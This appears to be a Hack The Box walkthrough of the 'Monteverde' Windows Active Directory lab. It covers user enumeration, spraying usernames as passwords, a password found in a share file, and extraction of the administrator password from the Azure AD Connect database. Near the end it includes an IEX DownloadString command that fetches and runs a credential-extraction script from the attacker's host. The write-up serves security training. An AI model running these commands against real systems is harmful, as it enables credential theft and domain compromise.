---
title: "HTB: Monteverde"
date: 2025-02-05
draft: false
summary: HTB Medium Difficulty Windows Machine. AD.
tags:
  - windows
  - medium
  - active-directory
category: HTB
---
#### Box Information
- **Creator**: egre55
- **Release Date**: 11 Jan, 2020
- **OS**: Windows
- **Difficulty**: Medium

The machine starts with getting a list of usernames with either SMB null authentication or LDAP anonymous binding, followed by spraying the users with their own usernames, leading to a valid credential. This account has access to the SMB shares which contain a file containing credential for another user. This user is a part of "Azure Admins" which has access to the local MSSQL database for Azure AD Connect, which can be used to extract a credential for the administrator.

#### Recon
###### Nmap
I start the box by running **Nmap** to scan for open ports. The scan results show that the box is an active directory machine because the Kerberos service is running (port 88). Also found that the domain name is `MEGABANK.LOCAL`.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ sudo nmap -p- --min-rate 10000 10.10.10.172
[sudo] password for chronopad:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 21:48 WIB
Nmap scan report for 10.10.10.172
Host is up (1.3s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49693/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 29.98 seconds

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49693 -sCV 10.10.10.172
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 21:50 WIB
Nmap scan report for 10.10.10.172
Host is up (0.63s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-04 14:50:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-02-04T14:51:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.89 seconds
```

###### SMB enumeration
I use **netexec** to test if SMB allows null authentication (anonymous login with no password). The result shows that it allows null authentication but we can't enumerate shares with it.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/cat-linux]
└─$ netexec smb 10.10.10.172 -u '' -p ''
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\:

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/cat-linux]
└─$ netexec smb 10.10.10.172 -u '' -p '' --shares
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\:
SMB         10.10.10.172    445    MONTEVERDE       [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

I also test if `guest` account can be used to view shares, but the account is disabled.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/cat-linux]
└─$ netexec smb 10.10.10.172 -u 'guest' -p '' --shares
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\guest: STATUS_ACCOUNT_DISABLED
```

I used the SMB null authentication to enumerate users available on the machine. Found several unique local users with `--users`. If `--users` doesn't work, I will try to enumerate users using `--rid-brute` instead.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/cat-linux]
└─$ netexec smb 10.10.10.172 -u '' -p '' --users
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\:
SMB         10.10.10.172    445    MONTEVERDE       -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.10.172    445    MONTEVERDE       Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.10.172    445    MONTEVERDE       AAD_987d7f2f57d2              2020-01-02 22:53:24 0       Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
SMB         10.10.10.172    445    MONTEVERDE       mhope                         2020-01-02 23:40:05 0
SMB         10.10.10.172    445    MONTEVERDE       SABatchJobs                   2020-01-03 12:48:46 0
SMB         10.10.10.172    445    MONTEVERDE       svc-ata                       2020-01-03 12:58:31 0
SMB         10.10.10.172    445    MONTEVERDE       svc-bexec                     2020-01-03 12:59:55 0
SMB         10.10.10.172    445    MONTEVERDE       svc-netapp                    2020-01-03 13:01:42 0
SMB         10.10.10.172    445    MONTEVERDE       dgalanos                      2020-01-03 13:06:10 0
SMB         10.10.10.172    445    MONTEVERDE       roleary                       2020-01-03 13:08:05 0
SMB         10.10.10.172    445    MONTEVERDE       smorgan                       2020-01-03 13:09:21 0
SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated 10 local users: MEGABANK
```

I put all of the usernames from the output into a wordlist *user.list* with `awk`. 

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ awk '{print $5}' rawoutput.txt > user.list
```

###### LDAP enumeration
Instead of SMB, we can also try enumerating the LDAP to get a valid list of usernames. This will work if the LDAP allows anonymous binding. Here we can see that it indeed allows LDAP anonymous binding and we can get a list of domain users.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ windapsearch -u "" --dc 10.10.10.172 -m users | grep sAM
sAMAccountName: svc-ata
sAMAccountName: svc-bexec
sAMAccountName: mhope
sAMAccountName: SABatchJobs
sAMAccountName: AAD_987d7f2f57d2
sAMAccountName: Guest
sAMAccountName: svc-netapp
sAMAccountName: dgalanos
sAMAccountName: roleary
sAMAccountName: smorgan
```

We can also check the members of the "Remote Management Users" group. Found the user `mhope` to be a part of the group, which means that we can use WinRM to connect to the machine as this user if we find the credential for it.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ windapsearch -u "" --dc 10.10.10.172 -m members -s "Remote Management Users"
[+] Using group: CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL

dn: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
cn: Mike Hope
sAMAccountName: mhope
```

#### Shell as mhope
###### Password spraying with usernames
We don't have any other information right now, so there's two option on what we can do. The easier one is to hope that one of the users doesn't require Kerberos pre-authentication, so we can perform AS-REP Roasting. Sadly, none of the users are vulnerable to AS-REP Roasting.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ GetNPUsers.py MEGABANK.LOCAL/ -usersfile user.list -dc-ip 10.10.10.172 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

/home/chronopad/.local/bin/GetNPUsers.py:163: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
```

The second option is to do password spraying. Since we don't have any wordlist and password spraying with *rockyou.txt* doesn't seem to be really feasible, we can try spraying each username with their own username. This succeeded and I found the user `SABatchJobs` to be reusing the username as the password.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ netexec smb 10.10.10.172 -u user.list -p user.list --continue-on-success
...SNIP...
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
...SNIP...
```

###### SMB enumeration as SABatchJobs
I check the share permissions of `SABatchJobs` user  and found that this user can read the `azure_uploads` and `users$` shares.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ netexec smb 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --shares
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share
SMB         10.10.10.172    445    MONTEVERDE       users$          READ
```

I connected to the `azure_uploads` share to view the contents, but it is empty.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ smbclient //10.10.10.172/azure_uploads -U SABatchJobs SABatchJobs
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 19:43:06 2020
  ..                                  D        0  Fri Jan  3 19:43:06 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \>
```

I connected to the other share, `users$`. The share contains some directories for different users. I found something interesting in the directory *mhope*. Retrieved the file *azure.xml*, which contains a password, which should be for user `mhope`.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ cat azure.xml
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

I used the credential to authenticate as `mhope` and list available shares. There are no new or different share permissions.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ netexec smb 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$' --shares
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
SMB         10.10.10.172    445    MONTEVERDE       [*] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share
SMB         10.10.10.172    445    MONTEVERDE       users$          READ
```

###### BloodHound enumeration as mhope
Since there's nothing different with the SMB, I decided to use this credential to enumerate using **BloodHound**. 

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ bloodhound-python -u 'mhope' -p '4n0therD4y@n0th3r$' -d MEGABANK.LOCAL -ns 10.10.10.172 --zip -c all -v
...SNIP...
INFO: Done in 01M 20S
INFO: Compressing output into 20250204223607_bloodhound.zip

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ sudo neo4j start
...SNIP...

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ bloodhound
```

I uploaded the collected data to **BloodHound** and queried for "Shortest Path to Domain Admins". Found that `mhope` has `CanPSRemote`, which means we can connect to the machine as `mhope`.

![Image Description](/images/Pasted%20image%2020250204224248.png)

I also enumerate some information available for `mhope`, and found that this user is part of the `Azure Admins` domain group.

###### WinRM as mhope
I connected to the machine with `mhope:4n0therD4y@n0th3r$` with **evil-winrm** and obtained the user flag.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents>
```

#### Shell as administrator
###### Shell enumeration
I run `whoami /all` to list all the information about the current user `mhope`. Rediscovered that this user is a part of the `Azure Admins` group, which should be interesting.

```
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

```
*Evil-WinRM* PS C:\Users\mhope\Documents> Get-ADGroup -Identity 'Azure Admins'


DistinguishedName : CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
GroupCategory     : Security
GroupScope        : Global
Name              : Azure Admins
ObjectClass       : group
ObjectGUID        : 9b082088-2b04-4535-ba61-e1104d7c72fb
SamAccountName    : Azure Admins
SID               : S-1-5-21-391775091-850290835-3566037492-2601
```

If we list the program files, we can see that there are "Microsoft Azure AD Sync" and "Microsoft Azure AD Connect". 

```
*Evil-WinRM* PS C:\Users\mhope\Documents> gci -force C:\"Program Files"


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
```

###### Azure AD Connect PE
Found this [blog](https://blog.xpnsec.com/azuread-connect-for-redteam/) that talks about attacking the Password Hash Synchronization feature of the Azure AD Connect. Following the steps, I found the **SQLCMD.EXE** tool to query to the local MSSQL database.

```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> SQLCMD.EXE -?
Microsoft (R) SQL Server Command Line Tool
Version 14.0.2027.2 NT
Copyright (C) 2017 Microsoft Corporation. All rights reserved.

usage: Sqlcmd            [-U login id]          [-P password]
  [-S server]            [-H hostname]          [-E trusted connection]
  [-N Encrypt Connection][-C Trust Server Certificate]
  [-d use database name] [-l login timeout]     [-t query timeout]
...SNIP...
```

Based on the blog above, the configuration data is stored in *private_configuration_xml* and *encrypted_configuration* field. I validated that I can access the data in both fields.

```
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> SQLCMD.EXE -q "select top(1) private_configuration_xml from [ADSync].[dbo].[mms_management_agent] WHERE ma_type = 'AD'"
private_configuration_xml
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL

(1 rows affected)
*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> SQLCMD.EXE -q "select top(1) encrypted_configuration from [ADSync].[dbo].[mms_management_agent] WHERE ma_type = 'AD'"
encrypted_configuration
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g

(1 rows affected)
```

The blog provides a PoC to extract and decrypt the credentials stored in the files. I used `IEX` to import the PoC from my machine (with Python web server) and run it, but it returns an error and crashes the **evil-winrm**.

```
*Evil-WinRM* PS C:\Users\mhope\Documents> IEX(New-Object Net.WebClient).DownloadString("http://10.10.16.4:8000/adconnectsync.ps1")

Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 1726]: <f:WSManFault Code='1726' Machine='10.10.10.172' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message>The WSMan provider host process did not return a proper response.  A provider in the host process may have behaved improperly. </f:Message></f:WSManFault>

Error: Exiting with code 1
```

Turns out the connection string needs a slight tweaking to make it work. Here's the modified SQL connection string: `$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"`

Now running the PoC successfully decrypted the stored credential, giving us `administrator:d0m@in4dminyeah!`.

```
*Evil-WinRM* PS C:\Users\mhope\Documents> IEX(New-Object Net.WebClient).DownloadString("http://10.10.16.4:8000/adconnectsync.ps1")
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

I used this credential to connect with **evil-winrm** as `administrator`, finishing this box.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/monteverde-windows]
└─$ evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
